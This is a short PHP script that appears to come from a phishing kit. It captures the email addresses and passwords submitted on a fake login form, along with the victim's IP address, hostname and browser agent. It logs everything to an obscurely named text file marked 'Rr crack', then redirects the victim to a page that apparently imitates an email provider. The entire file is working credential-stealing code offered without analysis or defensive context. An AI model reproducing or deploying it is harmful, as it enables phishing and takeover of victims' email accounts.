<?php
$email = $_POST['emailAddress'];
$passwd = $_POST['emailPassword'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$agent = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen('f5t4d334.tf5td43-4u=7gu6y5645y65_yg=ug-67fy545t.54yf-75u=68-gu75_56u=67-guy655.2es-24dt=y7-8g6u7y_57u=78-6g7u5y6s.35yd-5fu=g68-7u56_e5h6=78g-iu67f5y64.y-57u=78-h6u6_45=u-gi6u75y6.32es-24t=6-u8hig6u7_76i=h97-i687u565.st3-d=6u-6gi7.txt', 'a+');
fwrite ($fp, "
Email: $email
Passw: $passwd

IPADD: $ip
HOSTA: $host
AGENT: $agent
==============Rr crack==============");
fclose($fp);


header("Location: spectrumcc.html");
?> 